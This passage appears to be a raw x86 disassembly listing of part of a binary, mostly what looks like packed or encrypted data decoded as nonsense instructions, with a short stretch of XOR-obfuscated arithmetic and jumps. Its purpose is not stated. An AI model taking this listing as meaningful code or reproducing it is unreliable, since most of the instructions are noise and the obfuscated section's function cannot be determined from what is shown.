  4058e6:	ins    DWORD PTR es:[edi],dx
  4058e7:	mov    esp,0x3dc561c8
  4058ec:	inc    edx
  4058ed:	enter  0x62f7,0x98
  4058f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f2:	cld    
  4058f3:	and    eax,0xa7b900d6
  4058f8:	(bad)  
  4058fa:	pop    ecx
  4058fb:	pop    ebx
  4058fc:	into   
  4058fd:	cli    
  4058fe:	loopne 0x4058ca
  405900:	ins    BYTE PTR es:[edi],dx
  405901:	shl    esp,1
  405903:	lds    esp,FWORD PTR [ecx]
  405905:	dec    ecx
  405906:	cmp    ecx,esi
  405908:	scas   eax,DWORD PTR es:[edi]
  405909:	call   DWORD PTR [esi-0x5f]
  40590c:	push   esp
  40590d:	sbb    bh,ch
  40590f:	sbb    BYTE PTR [eax-0x324e0e1b],bh
  405915:	popf   
  405916:	out    0xd8,al
  405918:	pushf  
  405919:	xchg   ecx,eax
  40591a:	sub    ebx,DWORD PTR [ebp+0x5c]
  40591d:	or     edi,ebp
  40591f:	in     al,0x88
  405921:	cmp    BYTE PTR [edx+edi*2-0xc21f506],dh
  405928:	int    0xe4
  40592a:	pop    ebp
  40592b:	fnop   
  40592d:	sub    bl,BYTE PTR [edx-0x16]
  405930:	pop    ebx
  405931:	ret    0xfbeb
  405934:	xor    DWORD PTR [ecx+ecx*2],edx
  405937:	ror    DWORD PTR [ebx],1
  405939:	push   cs
  40593a:	outs   dx,BYTE PTR ds:[esi]
  40593b:	pop    edi
  40593c:	push   ecx
  40593d:	dec    ecx
  40593e:	in     al,0x6d
  405940:	aaa    
  405941:	fimul  WORD PTR [eax]
  405943:	ror    BYTE PTR [ebx],1
  405945:	inc    edi
  405946:	pop    ss
  405947:	mov    ds:0xfceb575f,eax
  40594c:	mov    ah,0xb
  40594e:	and    DWORD PTR [eax],edx
  405950:	dec    DWORD PTR [ecx+0x1880322c]
  405956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405957:	inc    esp
  405958:	cmp    bl,BYTE PTR [edx]
  40595a:	mov    bl,BYTE PTR [edx]
  40595c:	jp     0x405938
  40595e:	sub    eax,0xe60411b3
  405963:	mov    ecx,0xf2330021
  405968:	mov    eax,0x50fa783a
  40596d:	sbb    BYTE PTR [ebx-0x6c],ch
  405970:	push   0x67
  405972:	jecxz  0x40593e
  405974:	mov    al,ds:0x6c952c81
  405979:	mov    ebp,0x6f6f626
  40597e:	ds mov esp,0xa0dda05d
  405984:	sar    DWORD PTR [ebx+ebp*8+0x31f6ecd4],1
  40598b:	inc    ecx
  40598c:	push   esp
  40598d:	sti    
  40598e:	out    dx,al
  40598f:	and    esp,DWORD PTR [ebx]
  405991:	inc    esi
  405992:	repnz or DWORD PTR [ebp-0x4e],0xcda7f5fb
  40599a:	and    BYTE PTR [ecx],dh
  40599c:	sub    BYTE PTR [edx],ah
  40599e:	push   0xffffffca
  4059a0:	push   edi
  4059a1:	jmp    0x405949
  4059a3:	aam    0x59
  4059a5:	leave  
  4059a6:	xchg   ecx,eax
  4059a7:	imul   eax,DWORD PTR [ebp+0x5f],0xffffffaf
  4059ab:	cmp    al,0xe2
  4059ad:	xor    esp,DWORD PTR [edi]
  4059af:	js     0x405942
  4059b1:	fs in  eax,0x62
  4059b4:	lods   eax,DWORD PTR ds:[esi]
  4059b5:	jecxz  0x405965
  4059b7:	xchg   edx,eax
  4059b8:	leave  
  4059b9:	fisttp QWORD PTR [eax-0x7e915f0e]
  4059bf:	xchg   BYTE PTR [eax],bh
  4059c1:	dec    ebp
  4059c2:	not    BYTE PTR [edi+edx*4]
  4059c5:	sub    edi,ebp
  4059c7:	mov    ebx,0xad3ee56f
  4059cc:	push   edx
  4059cd:	rcl    al,0xa7
  4059d0:	cmc    
  4059d1:	push   edi
  4059d2:	call   0xc9833956
  4059d7:	xor    BYTE PTR [eax-0x2d],ch
  4059da:	les    esi,FWORD PTR [eax+edi*8-0x52]
  4059de:	mov    ecx,0x6a850eb9
  4059e3:	sub    DWORD PTR [eax-0x2a],eax
  4059e6:	(bad)  
  4059e7:	cmc    
  4059e8:	in     eax,dx
  4059e9:	cs stos BYTE PTR es:[edi],al
  4059eb:	push   edx
  4059ec:	adc    BYTE PTR [edx],ch
  4059ee:	xor    eax,0xaceb9963
  4059f3:	xchg   ecx,eax
  4059f4:	je     0x4059fb
  4059f6:	xlat   BYTE PTR ds:[ebx]
  4059f7:	shr    ah,cl
  4059f9:	inc    ebx
  4059fa:	cmp    eax,0xdb84be8
  4059ff:	push   esp
  405a00:	cdq    
  405a01:	into   
  405a02:	test   ecx,0xcf10c2c4
  405a08:	and    eax,0x2fea9bce
  405a0d:	mov    WORD PTR [edx],cs
  405a0f:	bound  ebp,QWORD PTR [ecx-0x10]
  405a12:	daa    
  405a13:	lods   al,BYTE PTR ds:[esi]
  405a14:	push   0x4dad9698
  405a19:	pop    ebp
  405a1a:	mov    ebx,0x68c0470c
  405a1f:	mov    edi,0x12df911
  405a24:	(bad)  
  405a25:	mov    eax,0xf5aeb6df
  405a2a:	(bad)
  405a2f:	push   ds
  405a30:	mov    bl,0x44
  405a32:	(bad)  
  405a33:	icebp  
  405a34:	pop    ecx
  405a35:	jb     0x4059d0
  405a37:	jge    0x4059c0
  405a39:	ret    0xbcbf
  405a3c:	sahf   
  405a3d:	and    DWORD PTR [ebp-0x7c],edx
  405a40:	xor    al,0x9a
  405a42:	or     BYTE PTR [ebx+edi*2-0x4c],bh
  405a46:	ficomp WORD PTR [eax+0x542b44d7]
  405a4c:	or     eax,0xa7c917fb
  405a51:	push   cs
  405a52:	sbb    bh,BYTE PTR [ecx-0x2fa2cf6c]
  405a58:	inc    edx
  405a59:	xchg   BYTE PTR [edx-0x2f],ah
  405a5c:	sbb    dl,BYTE PTR [ebx+0x86add69]
  405a62:	cmc    
  405a63:	pop    edi
  405a64:	sar    DWORD PTR [eax],1
  405a66:	and    al,0x49
  405a68:	mov    al,0x3e
  405a6a:	loopne 0x405a0b
  405a6c:	lahf   
  405a6d:	push   ds
  405a6e:	shl    BYTE PTR [edi+0x1e],0xbb
  405a72:	aam    0x99
  405a74:	fdiv   DWORD PTR ds:0x3af188b5
  405a7a:	add    ch,BYTE PTR [ebx]
  405a7c:	sbb    al,BYTE PTR [ebp-0x52d0865c]
  405a82:	cmp    BYTE PTR [edx-0x17],0x1f
  405a86:	mov    ebp,0xc67878c9
  405a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a8c:	shl    DWORD PTR [esi],1
  405a8e:	xchg   DWORD PTR [ecx],edi
  405a90:	mov    dh,BYTE PTR [edx]
  405a92:	inc    ebx
  405a93:	mov    eax,ds:0xceaf0138
  405a98:	dec    ecx
  405a99:	or     dh,BYTE PTR [eax]
  405a9b:	cmp    edx,esp
  405a9d:	stos   DWORD PTR es:[edi],eax
  405a9e:	pop    ebx
  405a9f:	jg     0x405a50
  405aa1:	(bad)  
  405aa2:	pop    eax
  405aa3:	bound  esp,QWORD PTR [ebx-0x2e3ad4fe]
  405aa9:	pop    edi
  405aaa:	cwde   
  405aab:	inc    ecx
  405aac:	aam    0x15
  405aae:	daa    
  405aaf:	div    dh
  405ab1:	mov    al,0x46
  405ab3:	mov    eax,DWORD PTR [esi]
  405ab5:	sbb    al,BYTE PTR [ebp+0x2f]
  405ab8:	push   ebx
  405ab9:	inc    esi
  405aba:	test   eax,0x611eddbe
  405abf:	mov    cl,0x2e
  405ac1:	stos   DWORD PTR es:[edi],eax
  405ac2:	retf   
  405ac3:	repz add BYTE PTR [eax+ebx*1-0x14],ch
  405ac8:	mov    edi,esi
  405aca:	fisubr WORD PTR [eax]
  405acc:	cld    
  405acd:	jle    0x405a98
  405acf:	dec    DWORD PTR [edi+esi*1-0x13]
  405ad3:	pop    es
  405ad4:	push   cs
  405ad5:	(bad)  
  405ad6:	pop    ds
  405ad7:	push   eax
  405ad8:	call   0xb129:0x1e9ec822
  405adf:	scas   eax,DWORD PTR es:[edi]
  405ae0:	js     0x405aad
  405ae2:	clc    
  405ae3:	adc    ecx,edi
  405ae5:	mul    BYTE PTR [ebx]
  405ae7:	cdq    
  405ae8:	das    
  405ae9:	add    esp,ecx
  405aeb:	push   ebx
  405aec:	call   0x9ef9:0xb0fdf3f9
  405af3:	dec    ebp
  405af4:	mov    ch,0xa
  405af6:	cdq    
  405af7:	jb     0x405b6b
  405af9:	push   edi
  405afa:	mov    eax,ds:0x714722cb
  405aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b01:	jnp    0x405b71
  405b03:	imul   esi,ecx,0xa6ebe3af
  405b09:	mov    BYTE PTR [eax-0x1],dh
  405b0c:	xor    bl,BYTE PTR [ebx+0x64]
  405b0f:	or     BYTE PTR ds:0x32396ed2,ah
  405b15:	shl    DWORD PTR [eax],1
  405b17:	in     al,0x72
  405b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b1b:	pop    eax
  405b1c:	xchg   ecx,eax
  405b1d:	in     al,dx
  405b1e:	pushf  
  405b1f:	rcr    DWORD PTR [edx+0x55],1
  405b22:	test   ch,dl
  405b24:	and    dh,BYTE PTR [esi-0x6b]
  405b27:	lock mul DWORD PTR [esi-0x4bfff4de]
  405b2e:	xchg   esi,eax
  405b2f:	adc    BYTE PTR [edi+0x7],bh
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x42ff7ef6
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405c26
  405be0:	popf   
  405be1:	add    al,0xa3
  405be3:	sbb    al,0xd7
  405be5:	mov    edi,0x17c15dec
  405bea:	xabort 0x48
  405bed:	mov    ebp,0x982a1c88
  405bf2:	loop   0x405c30
  405bf4:	and    al,0xb1
  405bf6:	stc    
  405bf7:	div    BYTE PTR [edi]
  405bf9:	jp     0x405ba5
  405bfb:	sbb    DWORD PTR [esi],esp
  405bfd:	pop    es
  405bfe:	push   esp
  405bff:	js     0x405bda
  405c01:	inc    ebp
  405c02:	(bad)  ds:0x368a996f
  405c08:	push   ebp
  405c09:	xor    BYTE PTR [edi],bh
  405c0b:	sbb    ebp,DWORD PTR [ecx+0x60]
  405c0e:	xchg   ebp,eax
  405c0f:	fwait
  405c10:	lock hlt 
  405c12:	aam    0x35
  405c14:	loopne 0x405c79
  405c16:	cmc    
  405c17:	sti    
  405c18:	mov    ah,dh
  405c1a:	(bad)  
  405c1c:	xchg   esi,eax
  405c1d:	mov    ds:0x9340bc01,eax
  405c22:	mov    ds:0xa083fc10,eax
  405c27:	test   al,0x46
  405c29:	adc    DWORD PTR [edi],eax
  405c2b:	mov    edi,0xacae2ab5
  405c30:	mov    edi,ds
  405c32:	icebp  
  405c33:	rcr    DWORD PTR [eax+0x24b32112],cl
  405c39:	scas   al,BYTE PTR es:[edi]
  405c3a:	data16 in al,0xae
  405c3d:	pop    ss
  405c3e:	and    bh,BYTE PTR [edi+0x6747544e]
  405c44:	mov    edx,fs
  405c46:	int    0x68
  405c48:	jo     0x405c17
  405c4a:	outs   dx,BYTE PTR ds:[esi]
  405c4b:	out    dx,eax
  405c4c:	clc    
  405c4d:	std    
  405c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c4f:	cmc    
  405c50:	(bad)  
  405c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c52:	jg     0x405c55
  405c54:	push   0xffffffe5
  405c56:	fnstenv [edi]
  405c58:	mov    ah,0xcf
  405c5a:	(bad)  
  405c5b:	cli    
  405c5c:	inc    edx
  405c5d:	and    ebp,DWORD PTR [edx+edi*4-0x48cd5891]
  405c64:	push   0x1d
  405c66:	mov    fs,WORD PTR [ecx-0x5c862a77]
  405c6c:	add    DWORD PTR [ebp+0x79ae006],esp
  405c72:	test   esi,ebx
  405c74:	int    0x7b
  405c76:	lods   al,BYTE PTR ds:[esi]
  405c77:	jle    0x405c32
  405c79:	cmp    ah,BYTE PTR ds:[ecx+0x7e877a32]
  405c80:	fs addr16 pop edi
  405c83:	retf   
  405c84:	pop    ds
  405c85:	pop    ecx
  405c86:	leave  
  405c87:	stc    
  405c88:	jb     0x405d05
  405c8a:	icebp  
  405c8b:	cmp    al,0x9a
  405c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c8e:	les    ecx,FWORD PTR [ebx]
  405c90:	leave  
  405c91:	div    BYTE PTR [edx]
  405c93:	cmp    eax,0xbed11177
  405c98:	fst    DWORD PTR [ebp+0x7]
  405c9b:	mov    dh,0xf2
  405c9d:	jno    0x405ceb
  405c9f:	mov    ah,0x29
  405ca1:	out    0x5e,eax
  405ca3:	mov    edi,0xdf5e8ddf
  405ca8:	push   ds
  405ca9:	mov    esi,0xa406bf4f
  405cae:	push   edi
  405caf:	adc    DWORD PTR [esi*1+0x68a8af29],ebx
  405cb6:	pop    ds
  405cb7:	and    DWORD PTR [esi+esi*2],esp
  405cba:	leave  
  405cbb:	adc    esp,DWORD PTR [ebx-0x52d951f4]
  405cc1:	push   edi
  405cc2:	(bad)  
  405cc3:	mov    bh,0xf9
  405cc5:	loope  0x405c9d
  405cc7:	ja     0x405d14
  405cc9:	add    eax,DWORD PTR [esi-0x4c22510a]
  405ccf:	xlat   BYTE PTR ds:[ebx]
  405cd0:	pop    edi
  405cd1:	iret   
  405cd2:	retf   0x9707
  405cd5:	(bad)  
  405cd6:	hlt    
  405cd7:	jae    0x405d4d
  405cd9:	test   al,0x33
  405cdb:	outs   dx,BYTE PTR ds:[esi]
  405cdc:	cmp    eax,ecx
  405cde:	dec    edx
  405cdf:	enter  0x9a0a,0xcb
  405ce3:	in     al,0x2d
  405ce5:	pop    ebx
  405ce6:	ret    0x306f
  405ce9:	lahf   
  405cea:	les    eax,FWORD PTR [eax-0x6db1019c]
  405cf0:	stc    
  405cf1:	inc    ecx
  405cf2:	outs   dx,BYTE PTR ds:[esi]
  405cf3:	push   esi
  405cf4:	or     al,0x31
  405cf6:	mov    edx,DWORD PTR [ebx]
  405cf8:	fldcw  WORD PTR [ebp+esi*4+0x16]
  405cfc:	sub    esi,ecx
  405cfe:	nop
  405cff:	inc    ecx
  405d00:	lock ret 0x88e5
  405d04:	fld    TBYTE PTR [si]
  405d07:	aaa    
  405d08:	inc    ebp
  405d09:	add    eax,0x33de3be3
  405d0e:	adc    eax,esi
  405d10:	pop    esp
  405d11:	iret   
  405d12:	or     bh,BYTE PTR [edi+0x10]
  405d15:	icebp  
  405d16:	fisub  DWORD PTR [ebp+0x44]
  405d19:	add    DWORD PTR [edx],esp
  405d1b:	cmp    BYTE PTR [ecx],dl
  405d1d:	mov    esp,0x3b6caaa3
  405d22:	push   ds
  405d23:	hlt    
  405d24:	mov    eax,DWORD PTR [esi+0x58bc3a5d]
  405d2a:	mov    DWORD PTR [edx+0x2e],edi
  405d2d:	call   0xe326:0x43023496
  405d34:	ins    DWORD PTR es:[edi],dx
  405d35:	(bad)  
  405d36:	out    0xad,eax
  405d38:	dec    eax
  405d39:	fimul  WORD PTR [eax-0x47]
  405d3c:	sar    BYTE PTR [eax+ecx*1],cl
  405d3f:	fstp   TBYTE PTR [ebx]
  405d41:	idiv   BYTE PTR [ebx]
  405d43:	out    dx,eax
  405d44:	jnp    0x405d2d
  405d46:	std    
  405d47:	sub    eax,0x8307ecc0
  405d4c:	inc    edx
  405d4d:	call   DWORD PTR [ecx]
  405d4f:	dec    ebx
  405d50:	jbe    0x405d2b
  405d52:	js     0x405cf4
  405d54:	jg     0x405dbe
  405d56:	or     al,0x63
  405d58:	nop
  405d59:	pop    edi
  405d5a:	mov    ecx,0x7b225010
  405d5f:	cmc    
  405d60:	imul   ebp,DWORD PTR [esi-0x55ab448f],0xf198d3a7
  405d6a:	loop   0x405d4a
  405d6c:	dec    edx
  405d6d:	or     eax,eax
  405d6f:	cdq    
  405d70:	repnz fldenv [edi+0x30]
  405d74:	pextrw ecx,mm1,0x31
  405d78:	cld    
  405d79:	iret   
  405d7a:	mov    bh,0x44
  405d7c:	loope  0x405df2
  405d7e:	scas   al,BYTE PTR es:[edi]
  405d7f:	out    dx,al
  405d80:	imul   ebp,DWORD PTR [eax+0x74],0x62
  405d84:	neg    bl
  405d86:	int    0x78
  405d88:	and    DWORD PTR [ebx+0x69379eee],edx
  405d8e:	mov    bl,0x21
  405d90:	xchg   esi,eax
  405d91:	iret   
  405d92:	mov    bl,0x82
  405d94:	stos   DWORD PTR es:[edi],eax
  405d95:	mov    eax,0xd1ddea77
  405d9a:	jmp    0x6db0:0xbc087143
  405da1:	ret    0x69e3
  405da4:	pop    ds
  405da5:	xor    ebp,eax
  405da7:	pusha  
  405da8:	mov    al,ds:0x460f17e5
  405dad:	push   esi
  405dae:	and    BYTE PTR [ebp+0x5f70bb31],dl
  405db4:	mov    dh,0xd0
  405db6:	pop    ss
  405db7:	call   0xb481:0xec38c445
  405dbe:	add    eax,0xab2b1acb
  405dc3:	add    DWORD PTR cs:[edi+0x66d072fa],eax
  405dca:	cli    
  405dcb:	add    al,0xe2
  405dcd:	or     dl,BYTE PTR [edx]
  405dcf:	popa   
  405dd0:	jns    0x405d56
  405dd2:	arpl   WORD PTR [esi-0x7a],dx
  405dd5:	adc    dh,BYTE PTR [eax+0x78b04388]
  405ddb:	sub    eax,0x724daa68
  405de0:	call   0xcc2af384
  405de5:	mov    ch,dl
  405de7:	mov    ah,0xfd
  405de9:	adc    BYTE PTR [ebx],0xf8
  405dec:	pop    ds
  405ded:	pop    esi
  405dee:	xor    DWORD PTR [esi+esi*2+0x1fde5b76],ebx
  405df5:	lds    ecx,FWORD PTR [eax]
  405df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df8:	mov    al,0xd4
  405dfa:	ret    
  405dfb:	mov    eax,0xc3e09e77
  405e00:	add    eax,0x9e236315
  405e05:	and    DWORD PTR [edx+eiz*1-0x37a3ee33],ebx
  405e0c:	mov    ecx,0x6237c031
  405e11:	jbe    0x405e2c
  405e13:	fist   DWORD PTR [edi]
  405e15:	test   DWORD PTR [edi-0x29],edi
  405e18:	lock aad 0x8e
  405e1b:	add    eax,0xef57e87c
  405e20:	mov    ds:0x98585729,eax
  405e25:	inc    esp
  405e26:	mov    al,0xc5
  405e28:	sar    DWORD PTR [eax],1
  405e2a:	or     esi,ebx
  405e2c:	push   esp
  405e2d:	retf   0xdf52
  405e30:	inc    edx
  405e31:	push   es
  405e32:	ret    
  405e33:	sub    ch,BYTE PTR [ebp+0x3e]
  405e36:	jmp    0x6d1e:0x5af612bb
  405e3d:	sti    
  405e3e:	loope  0x405e17
  405e40:	hlt    
  405e41:	sti    
  405e42:	call   esi
  405e44:	jbe    0x405deb
  405e46:	clc    
  405e47:	fadd   QWORD PTR ds:0x1a69ce8f
  405e4d:	pusha  
  405e4e:	popf   
  405e4f:	sbb    DWORD PTR [edi+0x7c9691ed],ecx
  405e55:	test   BYTE PTR [esi+esi*2-0x6f83da67],cl
  405e5c:	xlat   BYTE PTR ds:[ebx]
  405e5d:	out    0xcb,eax
  405e5f:	sar    DWORD PTR [edx-0x17ab88dd],cl
  405e65:	mov    ds:0x880582c8,eax
  405e6a:	scas   eax,DWORD PTR es:[edi]
  405e6b:	mov    WORD PTR [edx+ebx*1],cs
  405e6e:	push   DWORD PTR [ebp+ecx*4-0x6c98d976]
  405e75:	aas    
  405e76:	adc    ebp,DWORD PTR [ebp+edx*4+0x35]
  405e7a:	mov    DWORD PTR [esi+0x3b],esp
  405e7d:	outs   dx,BYTE PTR ds:[esi]
  405e7e:	mov    ch,0xbf
  405e80:	xchg   ebx,eax
  405e81:	cmp    al,0xb5
  405e83:	push   0x5151b814
  405e88:	aas    
  405e89:	xor    eax,0x828f85fd
  405e8e:	mov    ah,0xd1
  405e90:	in     eax,0xf4
  405e92:	retf   
  405e93:	and    eax,0xb8cf6595
  405e98:	je     0x405eab
  405e9a:	mov    ch,0x1d
  405e9c:	add    eax,0x668d1692
  405ea1:	in     al,dx
  405ea2:	mov    dl,BYTE PTR [ecx+ebp*8-0x74f30350]
  405ea9:	int3   
  405eaa:	ss test eax,0x411edc7c
  405eb0:	dec    esp
  405eb1:	outs   dx,DWORD PTR ds:[esi]
  405eb2:	cmovs  ecx,DWORD PTR [ebx+0x6c266f2c]
  405eb9:	popa   
  405eba:	push   eax
  405ebb:	comiss xmm1,DWORD PTR [ecx-0x56]
  405ebf:	or     DWORD PTR [edi+0x7e03e060],ebx
  405ec5:	int    0xdc
  405ec7:	ja     0x405eb5
  405ec9:	dec    ecx
  405eca:	loopne 0x405eec
  405ecc:	imul   ebp,esi,0xffffffd7
  405ecf:	iret   
  405ed0:	sahf   
  405ed1:	mov    dl,0x75
  405ed3:	test   eax,0x1f951581
  405ed8:	call   0xa38c3ea8
  405edd:	fimul  DWORD PTR [esi-0x7f167316]
  405ee3:	stos   BYTE PTR es:[edi],al
  405ee4:	test   ebp,ecx
  405ee6:	or     DWORD PTR [esi+0x56b5f7e],edi
  405eec:	mov    WORD PTR [eax+0x2c47f5c7],ss
  405ef2:	pop    ebx
  405ef3:	xchg   esi,eax
  405ef4:	adc    al,BYTE PTR [esi]
  405ef6:	sub    al,0x2f
  405ef8:	fistp  WORD PTR [ebx-0x1f]
  405efb:	data16 jb 0x405f1f
  405efe:	call   0x8684f7ac
  405f03:	sbb    ecx,DWORD PTR [ecx+ebx*4]
  405f06:	and    al,0xb2
  405f08:	sbb    eax,0x2d084705
  405f0d:	leave  
  405f0e:	mov    esi,0xf133c179
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [edx-0x59892bcd],ss
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	fist   WORD PTR [edi]
  405f34:	in     al,0xbb
  405f36:	sub    cl,0x40
  405f39:	cli    
  405f3a:	dec    ecx
  405f3b:	and    al,0x67
  405f3d:	or     al,0x71
  405f3f:	rol    BYTE PTR [ecx+0x6341b4c0],1
  405f45:	out    0x44,al
  405f47:	fadd   QWORD PTR ds:0x37aa03ef
  405f4d:	push   0xffffffc3
  405f4f:	mov    ds:0xddfee31a,eax
  405f54:	xchg   DWORD PTR [edi],esi
  405f56:	aad    0x39
  405f58:	sub    BYTE PTR [esi+0x18a9df1],ch
  405f5e:	fisub  DWORD PTR [eax]
  405f60:	call   0xe17d:0xd481c6d
  405f67:	leave  
  405f68:	xchg   ebx,eax
  405f69:	add    ebx,ebp
  405f6b:	xor    ah,BYTE PTR ss:[ecx+edi*8]
  405f6f:	and    eax,0x79abc0ce
  405f74:	jecxz  0x405ef7
  405f76:	mov    ch,0x49
  405f78:	jmp    0x405f13
  405f7a:	sub    ebp,DWORD PTR [ebp-0x5e59696f]
  405f80:	rcl    BYTE PTR [eax-0x7d86745c],0x9c
  405f87:	sub    ebx,eax
  405f89:	iret   
  405f8a:	xchg   ecx,eax
  405f8b:	jne    0x405fc6
  405f8d:	jno    0x405f34
  405f8f:	rcr    BYTE PTR [edx+0x59],cl
  405f92:	jg     0x405fa8
  405f94:	adc    bl,BYTE PTR [edi-0xbc5049f]
  405f9a:	mov    WORD PTR [eax+0x33],ss
  405f9d:	shr    DWORD PTR [edx],0x8
  405fa0:	cmc    
  405fa1:	ror    DWORD PTR [ecx+edi*1+0x12],cl
  405fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fa6:	sub    ebx,eax
  405fa8:	popf   
  405fa9:	mov    ebp,0xf7bb809e
  405fae:	int3   
  405faf:	test   eax,0x146d9326
  405fb4:	dec    edi
  405fb5:	js     0x405f79
  405fb7:	scas   al,BYTE PTR es:[edi]
  405fb8:	add    esp,DWORD PTR [ebp-0x24341e67]
  405fbe:	aam    0xcb
  405fc0:	fnstsw WORD PTR [esp+ebp*2]
  405fc3:	sahf   
  405fc4:	std    
  405fc5:	sbb    dh,BYTE PTR [edx+0x6f5e0eb5]
  405fcb:	cmp    al,0xed
  405fce:	or     dl,ah
  405fd0:	aad    0xef
  405fd2:	add    eax,0x7d5bc261
  405fd7:	jno    0x406043
  405fd9:	loop   0x405f94
  405fdb:	aam    0xa0
  405fdd:	add    ebp,DWORD PTR [eax-0x77]
  405fe0:	push   ecx
  405fe1:	dec    ebp
  405fe2:	lahf   
  405fe3:	inc    esp
  405fe4:	sub    edi,edi
  405fe6:	cli    
  405fe7:	jno    0x405fb1
  405fe9:	stos   DWORD PTR es:[edi],eax
  405fea:	sbb    ebx,DWORD PTR [ebx+0x55fda9d5]
  405ff0:	xlat   BYTE PTR ds:[ebx]
  405ff1:	dec    edi
  405ff2:	jb     0x405fe1
  405ff4:	int3   
  405ff5:	mov    eax,DWORD PTR [edi]
  405ff7:	outs   dx,DWORD PTR ds:[esi]
  405ff8:	or     al,0xe4
  405ffa:	outs   dx,BYTE PTR ds:[esi]
  405ffb:	and    eax,0x210fb123
  406000:	sub    ecx,DWORD PTR [ebx+0x268ab566]
  406006:	fs jp  0x40602a
  406009:	sbb    al,0xf
  40600b:	or     eax,0x2bab0f47
  406010:	cmc    
  406011:	or     BYTE PTR [ebx+ebx*2-0x4a],0x25
  406016:	and    al,0x3
  406018:	cmp    ebp,DWORD PTR [esi]
  40601a:	adc    ecx,esi
  40601c:	retf   
  40601d:	pop    ecx
  40601e:	cmc    
  40601f:	loopne 0x40605c
  406021:	xor    al,0x5c
  406023:	mov    ecx,eax
  406025:	es jae 0x40605c
  406028:	stos   DWORD PTR es:[edi],eax
  406029:	test   cl,al
  40602b:	int3   
  40602c:	stc    
  40602d:	pop    ebp
  40602e:	ds inc ecx
  406030:	popa   
  406031:	adc    esi,DWORD PTR [eax]
  406033:	outs   dx,DWORD PTR ds:[esi]
  406034:	xchg   edi,eax
  406035:	xor    edi,eax
  406037:	mov    al,0x45
  406039:	(bad)  
  40603a:	jno    0x40606c
  40603c:	sbb    eax,0x1fb8d7a3
  406041:	sbb    al,BYTE PTR [ebx+edi*1+0x1c]
  406045:	int3   
  406046:	cli    
  406047:	iret   
  406048:	lds    esp,FWORD PTR [edi-0x13a04134]
  40604e:	xor    eax,0xcc486da4
  406053:	sub    ebp,esi
  406055:	dec    ecx
  406056:	adc    eax,0x35666788
  40605b:	xor    DWORD PTR [ecx+0x6775b42d],ebp
  406061:	fistp  QWORD PTR [ebp+0x20]
  406064:	mov    edi,0x3890136
  406069:	ret    0xefb3
  40606c:	ret    0x1b85
  40606f:	cmp    ch,BYTE PTR [edx+0x1cbab8ec]
  406075:	sub    BYTE PTR [edi+0x7af11962],al
  40607b:	aad    0x65
  40607d:	push   0xe85bd02c
  406082:	jecxz  0x406067
  406084:	xchg   ecx,eax
  406085:	mov    DWORD PTR [ecx],eax
  406087:	pop    eax
  406088:	xor    al,BYTE PTR [esi+0x73d92fe4]
  40608e:	pop    esp
  40608f:	inc    edx
  406090:	mov    edi,0x5b4a5669
  406095:	or     BYTE PTR [esi],bl
  406097:	shr    DWORD PTR [edi+0x6c2ea4f],0xb0
  40609e:	push   ebx
  40609f:	loope  0x406068
  4060a1:	xor    esi,DWORD PTR [ebp+0x28]
  4060a4:	leave  
  4060a5:	(bad)  
  4060a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060a7:	xor    dh,BYTE PTR [esi+0x3a]
  4060aa:	or     bh,BYTE PTR [ebp-0x24e2f72d]
  4060b0:	cmp    esi,ebx
  4060b2:	mov    DWORD PTR [esi+0x67],edi
  4060b5:	pusha  
  4060b6:	jns    0x4060a2
  4060b8:	ins    BYTE PTR es:[edi],dx
  4060b9:	fs xchg edi,eax
  4060bb:	jg     0x4060fd
  4060bd:	aad    0xb3
  4060bf:	mov    al,ds:0xebbb5428
  4060c4:	jns    0x406071
  4060c6:	xor    al,0xd3
  4060c8:	ret    0x45a3
  4060cb:	jo     0x406066
  4060cd:	or     eax,0x16c721e7
